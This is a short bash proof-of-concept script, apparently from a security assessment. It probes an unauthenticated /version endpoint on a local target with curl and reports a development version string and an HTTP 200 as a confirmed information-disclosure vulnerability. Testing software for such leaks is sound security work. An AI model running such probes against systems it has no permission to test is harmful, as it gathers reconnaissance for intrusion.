#!/bin/bash

# POC: Information Disclosure via /version Endpoint
# Description: Demonstrates exposure of development version information through unauthenticated /version endpoint
# Target: http://localhost:2280/version

TARGET_URL="${1:-http://localhost:2280/version}"

echo "[*] Testing Information Disclosure via /version endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Basic GET request to /version
echo "[+] Test 1: Basic GET request"
echo "Command: curl -s -i $TARGET_URL"
echo "---"
response=$(curl -s -i "$TARGET_URL")
echo "$response"
echo ""

# Test 2: Verify development version marker is exposed
echo "[+] Test 2: Extract and validate version information"
version_json=$(curl -s "$TARGET_URL")
echo "Response: $version_json"
echo ""

# Check if the response contains 'dev' marker
if echo "$version_json" | grep -q '"version"'; then
  echo "[✓] Version endpoint is accessible without authentication"
  
  # Extract version string
  version_string=$(echo "$version_json" | grep -o '"version":"[^"]*"' | cut -d'"' -f4)
  echo "[✓] Version string: $version_string"
  
  if echo "$version_string" | grep -q "dev"; then
    echo "[✓] VULNERABILITY CONFIRMED: Development version marker 'dev' exposed in version string"
  else
    echo "[!] Version string does not contain 'dev' marker"
  fi
  
  # Extract major version
  version_number=$(echo "$version_string" | cut -d'-' -f1)
  echo "[✓] Application version: $version_number"
else
  echo "[!] Failed to retrieve version information"
  exit 1
fi

echo ""

# Test 3: Verify endpoint is accessible without authentication headers
echo "[+] Test 3: Verify no authentication required"
echo "Command: curl -s -w 'HTTP Status: %{http_code}\n' $TARGET_URL"
http_status=$(curl -s -w "%{http_code}" -o /dev/null "$TARGET_URL")
if [ "$http_status" = "200" ]; then
  echo "[✓] Endpoint returns HTTP 200 without authentication"
  echo "[✓] VULNERABILITY CONFIRMED: Version information disclosed to unauthenticated users"
else
  echo "[!] Unexpected HTTP status: $http_status"
fi

echo ""

# Test 4: Verify consistency across multiple requests
echo "[+] Test 4: Verify consistency across multiple requests"
for i in {1..3}; do
  version=$(curl -s "$TARGET_URL" | grep -o '"version":"[^"]*"')
  echo "Request $i: $version"
done

echo ""
echo "[+] POC Complete: Information disclosure vulnerability confirmed"